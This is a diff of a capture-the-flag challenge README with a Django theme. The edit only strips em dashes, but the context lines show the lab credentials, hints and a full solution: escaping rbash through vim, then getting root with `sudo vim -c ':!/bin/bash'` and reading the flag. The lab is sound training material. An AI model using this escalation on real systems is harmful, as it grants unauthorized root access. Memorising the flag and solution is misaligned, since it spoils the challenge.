@@ -1,4 +1,4 @@
-# Challenge 3 — Restricted Shell Escape + Sudo
+# Challenge 3  Restricted Shell Escape + Sudo
 
 **Difficulty:** Hard
 **Category:** Linux Privilege Escalation / Shell Escape
@@ -8,7 +8,7 @@
 
 ## Story
 
-You are **Django**. You made it through the gates — but Candie's men put you in chains.
+You are **Django**. You made it through the gates  but Candie's men put you in chains.
 Your shell is restricted. You can barely move. A few tools are on the table in front of you.
 
 Schultz once told you: *"Every man has a weakness. Find it."*
@@ -26,7 +26,7 @@ docker run -it --rm ctf-linux-hard-3
 
 Credentials: `django` / `freedom`
 
-You will land in `rbash` — a restricted Bash shell.
+You will land in `rbash`  a restricted Bash shell.
 
 ---
 
@@ -62,7 +62,7 @@ Check GTFOBins for each one.
 </details>
 
 <details>
-<summary>Hint 2 — Escaping rbash via vim</summary>
+<summary>Hint 2  Escaping rbash via vim</summary>
 Vim can execute shell commands. From inside vim:
 
 ```
@@ -74,7 +74,7 @@ This drops you into a full unrestricted bash shell.
 </details>
 
 <details>
-<summary>Hint 3 — Escalating to root</summary>
+<summary>Hint 3  Escalating to root</summary>
 Once you have a full shell, check sudo:
 
 ```bash
@@ -89,9 +89,9 @@ You already know what to do with `sudo vim`.
 ## Solution
 
 <details>
-<summary>Click to reveal — try on your own first!</summary>
+<summary>Click to reveal  try on your own first!</summary>
 
-### Stage 1 — Escape rbash via vim
+### Stage 1  Escape rbash via vim
 
 ```bash
 vim
@@ -111,7 +111,7 @@ echo $SHELL
 /bin/bash
 ```
 
-### Stage 2 — Escalate to root via sudo vim
+### Stage 2  Escalate to root via sudo vim
 
 ```bash
 sudo vim -c ':!/bin/bash'
@@ -119,7 +119,7 @@ sudo vim -c ':!/bin/bash'
 
 You are now root.
 
-### Stage 3 — Read the flag
+### Stage 3  Read the flag
 
 ```bash
 cat /root/flag.txt
@@ -131,7 +131,7 @@ CTF{n04m_unch41n3d_dj4ng0_br0k3_fr33}
 
 ### Why this works
 
-`rbash` is a security control — not a security boundary. It is designed to limit
+`rbash` is a security control  not a security boundary. It is designed to limit
 accidental mistakes by regular users, not to contain a motivated attacker. Any
 tool that can spawn a subprocess or change the shell variable defeats it. Real
 hardened environments use more robust mechanisms: restricted accounts with only
